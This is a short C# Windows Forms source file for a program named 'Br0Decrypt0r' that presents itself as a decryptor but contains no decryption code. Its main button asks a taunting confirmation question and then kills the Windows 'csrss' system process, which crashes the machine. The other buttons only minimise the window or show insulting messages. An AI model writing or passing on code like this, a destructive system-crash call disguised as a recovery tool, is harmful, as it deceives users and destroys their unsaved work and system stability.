using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics.Eventing.Reader;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Br0Decrypt0r
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("are u suuure you want to do that?", "I don't understand how proud of that garbage is the maker.", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
            }
            else if (dialogResult == DialogResult.No)
            {

            }
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("no you did not", "loser", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
    }
}
